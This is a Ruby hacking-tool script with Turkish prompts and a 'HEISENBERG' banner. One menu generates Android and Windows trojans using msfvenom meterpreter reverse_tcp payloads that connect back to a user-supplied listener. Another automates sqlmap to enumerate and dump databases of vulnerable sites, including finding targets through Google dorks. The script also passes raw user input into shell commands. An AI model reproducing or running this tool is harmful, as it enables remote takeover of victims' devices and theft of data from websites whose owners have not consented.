require "colorize"

puts"
██╗  ██╗███████╗██╗███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗  ██████╗ 
██║  ██║██╔════╝██║██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝ 
███████║█████╗  ██║███████╗█████╗  ██╔██╗ ██║██████╔╝█████╗  ██████╔╝██║  ███╗
██╔══██║██╔══╝  ██║╚════██║██╔══╝  ██║╚██╗██║██╔══██╗██╔══╝  ██╔══██╗██║   ██║
██║  ██║███████╗██║███████║███████╗██║ ╚████║██████╔╝███████╗██║  ██║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
BY : QUEY7Z   |  TERMUX OR LİNUX // Windows
======================================================================================"

def msfvenom
    system("cls")
    puts "NOT : MSFVENOM ARAÇLARI SADECE LİNUX VE TERMUX KULLANICILARI İÇİNDİR. WİNDOWS KULLANICILARI YARARLANAMAZ.".red
    sleep(5)
    system("cls")
    puts"
Trojan türü / trojan type
1) APK
2) WİNDOWS X86
3) WİNDOWS X64
    ".yellow

    print"İşlem : ".green
    islem = gets.chop().to_i

    if islem == 1
        print "LHOST : ".green
        lhost=gets.chop

        print "LPORT : ".green
        lport = gets.chop

        print "Kaydedilecek dizin : ".green
        dizin = gets.chop

        system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{dizin}")

    elsif islem == 2
        print "LHOST : ".green
        lhost=gets.chop

        print "LPORT : ".green
        lport = gets.chop

        print "Kaydedilecek dizin : ".green
        dizin = gets.chop

        system("msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
        
    elsif islem == 3
        print "LHOST : ".green
        lhost=gets.chop

        print "LPORT : ".green
        lport = gets.chop

        print "Kaydedilecek dizin : ".green
        dizin = gets.chop

        system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o #{dizin}")
    else
        system("cls")
    end
end

def sqlmap
    system("cls")
    system("clear")
    while 6
        puts "
1) Windows / Termux
2) Linux
        ".yellow

        print "Kullandığınız işletim sistemini seçin : ".green
        isletim = gets.chop

    if isletim == "1"
        puts "NOT : SQLMAP'İ İNDİRİN VE HEİSENBERG YAZILIMINI SQLMAP.PY DOSYASIYLA AYNI KONUMA ATIN. ARDINDAN PROGRAMI TEKRAR BAŞLATIN. (OTOMATİK MESAJDIR, SÖYLENENLERİ YAPSANIZ BİLE GÖSTERİLECEKTİR.)".red
        puts "NOT 2 : PYTHON2 İNDİRİN.".red
        puts "
1) Sadece SQL açıklı linki biliyorum.
2) SQL açıklı linki, veritabanı adını biliyorum.
3) SQL açıklı linki, veritabanı adını, tabloyu biliyorum.
4) SQL açıklı linki, veritabanı adını, tabloyu, colonu biliyorum.
5) SQL açıklı siteyi dork yardımıyla bulma (dork search)
6) TXT dosyasındaki birden fazla siteleri tarama
        ".yellow

        print "İşlem : ".green
        islemm = gets.chop

        if islemm == "1"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            system("python2 sqlmap.py -u #{acikli_link} --dbs")
        elsif islemm == "2"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            print "Veritabanı adını girin : ".yellow
            veritabani = gets.chop
            system("python2 sqlmap.py -u #{acikli_link} -D #{veritabani} --tables")
        elsif islemm == "3"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            print "Veritabanı adını girin : ".yellow
            veritabani = gets.chop
            print "Tablo adını girin : ".yellow
            tablo = gets.chop
            system("python2 sqlmap.py -u #{acikli_link} -D #{veritabani} -T #{tablo} --columns")
        elsif islemm == "4"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            print "Veritabanı adını girin : ".yellow
            veritabani = gets.chop
            print "Tablo adını girin : ".yellow
            tablo = gets.chop
            print "Kolon adını/adlarını (virgülle bitişik) girin : ".yellow
            kolon = gets.chop
            system("python2 sqlmap.py -u #{acikli_link} -D #{veritabani} -T #{tablo} -C #{kolon} --dump")
        elsif islemm == "5"
            print "Aratmak istediğiniz dorku giriniz : ".yellow
            dork = gets.chop
            system("python2 sqlmap.py -g #{dork}")
        elsif islemm == "6"
            print "TXT dosyasının olduğu yeri girin (örnek D:\\Notlarım\\hedef.txt) : ".yellow
            hedef = gets.chop
            system("python2 sqlmap.py -m #{hedef}")
        end

    elsif isletim == "2"
        puts "
1) Sadece SQL açıklı linki biliyorum.
2) SQL açıklı linki, veritabanı adını biliyorum.
3) SQL açıklı linki, veritabanı adını, tabloyu biliyorum.
4) SQL açıklı linki, veritabanı adını, tabloyu, colonu biliyorum.
5) SQL açıklı siteyi dork yardımıyla bulma (dork search)
6) TXT dosyasındaki birden fazla siteleri tarama
        ".yellow

        print "İşlem : ".green
        islemm = gets.chop

        if islemm == "1"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            system("sqlmap.py -u #{acikli_link} --dbs")
        elsif islemm == "2"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            print "Veritabanı adını girin : ".yellow
            veritabani = gets.chop
            system("sqlmap.py -u #{acikli_link} -D #{veritabani} --tables")
        elsif islemm == "3"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            print "Veritabanı adını girin : ".yellow
            veritabani = gets.chop
            print "Tablo adını girin : ".yellow
            tablo = gets.chop
            system("sqlmap.py -u #{acikli_link} -D #{veritabani} -T #{tablo} --columns")
        elsif islemm == "4"
            print "SQL açıklı linki girin : ".yellow
            acikli_link = gets.chop
            print "Veritabanı adını girin : ".yellow
            veritabani = gets.chop
            print "Tablo adını girin : ".yellow
            tablo = gets.chop
            print "Kolon adını/adlarını (virgülle bitişik) girin : ".yellow
            kolon = gets.chop
            system("sqlmap.py -u #{acikli_link} -D #{veritabani} -T #{tablo} -C #{kolon} --dump")
        elsif islemm == "5"
            print "Aratmak istediğiniz dorku giriniz : ".yellow
            dork = gets.chop
            system("sqlmap.py -g #{dork}")
        elsif islemm == "6"
            print "TXT dosyasının olduğu yeri girin (örnek D:\\Notlarım\\hedef.txt) : ".yellow
            hedef = gets.chop
            system("sqlmap.py -m #{hedef}")
        end
    end
    end
end


while 1
    puts "
1) SqlMap araçları
2) Msfvenom Trojan araçları
".yellow

    print "İşlem seçiniz : ".green
    islem = gets.chop
    if islem == "2"
        msfvenom
    elsif islem == "1"
        sqlmap
    end

end